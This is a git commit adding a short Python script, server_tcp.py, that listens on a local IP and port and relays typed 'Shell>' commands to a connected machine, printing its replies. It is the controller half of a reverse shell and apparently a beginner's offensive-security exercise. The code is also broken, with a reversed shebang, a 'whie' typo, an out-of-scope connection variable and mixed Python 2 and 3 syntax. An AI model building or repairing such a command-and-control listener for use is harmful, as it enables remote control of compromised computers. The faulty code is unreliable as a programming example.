ba66dd8f823fd2bac59c31d833d21297c25c949e
BansheePrime <cmapuk-xpehob@yandex.ru>
2022-08-09 09:20:56 +0300

    testing first code

---
+++ server_tcp.py
@@ -0,0 +1,28 @@
+!#/usr/bin/env python3
+import socket
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("192.168.60.5", 8282))
+    s.listen(1)
+    print('[+] Listening for incomming TCP connection on port 8282')
+    conn, addr = s.accept()
+    print('[+] We got a connection from: ', addr)
+
+
+whie True:
+    command = raw_input('Shell> ')
+    if 'terminate' in command:
+        conn.send('terminate')
+        conn.close()
+        break
+    else:
+        conn.send(command)
+        print conn.recv(1024)
+
+
+def main ():
+    connect()
+
+
+main()
